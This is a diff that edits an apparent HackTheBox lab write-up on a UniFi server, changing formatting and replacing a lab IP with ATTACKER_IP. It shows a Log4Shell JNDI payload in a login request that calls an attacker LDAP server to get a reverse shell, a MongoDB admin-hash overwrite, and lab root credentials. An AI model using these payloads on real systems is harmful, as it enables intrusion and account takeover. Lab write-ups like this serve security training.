@@ -129,7 +129,7 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=1, i
 Connection: keep-alive
 
-{"username":"testuser","password":"testpassword","remember":"${jndi:ldap://10.10.14.147:1389}",
+{"username":"testuser","password":"testpassword","remember":"${jndi:ldap://ATTACKER_IP:1389}",
 "strict":true}
 ```
 
@@ -140,8 +140,8 @@ tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 
 
-18:33:36.891611 IP 10.129.53.120.55414 > htb-ie8f9usvwk.1389: Flags [S], seq 1293191773, win 64240, options [mss 1362,sackOK,TS val 3435078781 ecr 0,nop,wscale 7], length 0
-18:33:36.891622 IP htb-ie8f9usvwk.1389 > 10.129.53.120.55414: Flags [R.], seq 0, ack 1293191774, win 0, length 0
+18:33:36.891611 IP 10.129.53.120.55414 > htb.1389: Flags [S], seq 1293191773, win 64240, options [mss 1362,sackOK,TS val 3435078781 ecr 0,nop,wscale 7], length 0
+18:33:36.891622 IP htb.1389 > 10.129.53.120.55414: Flags [R.], seq 0, ack 1293191774, win 0, length 0
 ```
 
 The target reaches out to port 1389 — Log4Shell is live. Stand up the malicious LDAP/JNDI server (author notes: `notes/infiltration/general/ldap-for-jndi-attack.md`) and complete the callback to get a reverse shell.
@@ -205,11 +205,14 @@ Stage result: UniFi admin access, root SSH with `NotACrackablePassword4U2022`, b
 
 ## Credentials
 
-| Source                         | Credential                                   | Notes                                   |
-| ------------------------------ | -------------------------------------------- | --------------------------------------- |
-| MongoDB `ace.admin` (original) | `x_shadow` `$6$Ry6Vdbse$8enMR5Znxoo…QgPTt4.` | SHA-512 crypt; not cracked              |
-| MongoDB overwrite              | UniFi admin → `password123`                  | Hash generated with `openssl passwd -6` |
-| Post-admin access              | root / `NotACrackablePassword4U2022`         | Used for root / SSH                     |
+**MongoDB `ace.admin` (original)** — `x_shadow` `$6$Ry6Vdbse$8enMR5Znxoo…QgPTt4.`
+SHA-512 crypt; not cracked.
+
+**MongoDB overwrite** — UniFi admin → `password123`
+Hash generated with `openssl passwd -6`.
+
+**Post-admin access** — root / `NotACrackablePassword4U2022`
+Used for root / SSH.
 
 ---
 
@@ -223,11 +226,9 @@ Stage result: UniFi admin access, root SSH with `NotACrackablePassword4U2022`, b
 
 ## Tools & cheat sheet
 
-| Tool                | Purpose in this box                 | Key command                                                      |
-| ------------------- | ----------------------------------- | ---------------------------------------------------------------- |
-| ffuf                | Path discovery on 8080              | paths under `/api`, `/manage`, `/setup`, …                       |
-| Burp Suite          | Capture / replay UniFi `/api/login` | POST JSON with `remember` JNDI payload                           |
-| `tcpdump`           | Confirm Log4Shell LDAP callback     | `sudo tcpdump -i tun0 port 1389`                                 |
-| Rogue LDAP / JNDI   | Deliver Log4Shell payload → shell   | see `notes/infiltration/general/ldap-for-jndi-attack.md`         |
-| `mongo`             | Read/update UniFi `ace` admin hash  | `mongo --port 27117 ace`                                         |
-| `openssl passwd -6` | Generate replacement `x_shadow`     | `openssl passwd -6 -salt $(openssl rand -base64 16) password123` |
+- [`ffuf`](/hacklas/enumeration/ffuf.md) — Path discovery on 8080
+- **Burp Suite** — Capture / replay UniFi `/api/login`
+- [`tcpdump`](/hacklas/enumeration/tcp/tcpdump.md) — Confirm Log4Shell LDAP callback
+- [Rogue LDAP / JNDI](/hacklas/infiltration/general/ldap-for-jndi-attack.md) — Deliver Log4Shell payload → shell
+- [`mongo`](/hacklas/enumeration/db/mongodb.md) — Read/update UniFi `ace` admin hash
+- [`openssl passwd -6`](/hacklas/infiltration/hash/generate-hash.md) — Generate replacement `x_shadow`
